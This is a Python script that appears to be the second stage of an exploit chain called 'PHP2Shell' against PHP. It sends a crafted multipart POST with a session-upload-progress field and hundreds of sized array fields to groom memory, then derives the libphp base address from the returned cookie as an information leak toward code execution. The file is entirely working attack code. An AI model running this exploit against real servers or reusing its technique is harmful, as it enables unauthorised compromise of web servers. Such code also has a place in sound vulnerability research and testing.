#!/usr/bin/env python3
"""Send request B for the PHP2Shell stage-2 libphp leak."""

import argparse

import exploit


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1/index.php")
    parser.add_argument("--target", type=int, default=406)
    parser.add_argument("--value-len", type=int, default=16)
    parser.add_argument("--arrays", type=int, default=983)
    parser.add_argument("--dtor-offset", type=lambda value: int(value, 0), default=0x5B4BAC)
    parser.add_argument("--timeout", type=float, default=40.0)
    args = parser.parse_args()

    target = exploit.Target(args.url, timeout=args.timeout, verbose=True)
    parts = [
        {"name": "PHPSESSID", "data": exploit.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(args.arrays):
        count = 16 if i == args.target else 1
        for j in range(count):
            parts.append(
                {
                    "name": f"a{i:04d}[{j}]",
                    "data": b"x" * args.value_len,
                }
            )
    response = target.post(
        exploit.build_multipart(parts, b"B" * 10),
        b"B" * 10,
        read_cap=1 << 20,
    )
    head, _, body = response.partition(b"\r\n\r\n")
    cookie = exploit.parse_cookie(response)
    print(head.decode("latin1", "replace"))
    print(f"COOKIE_LEN={len(cookie)} COOKIE={cookie[:160]!r}")
    print(
        "LIB=",
        hex(exploit.libphp_base_from_cookie(cookie, args.dtor_offset)),
    )
    print(body[:1024].decode("latin1", "replace"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
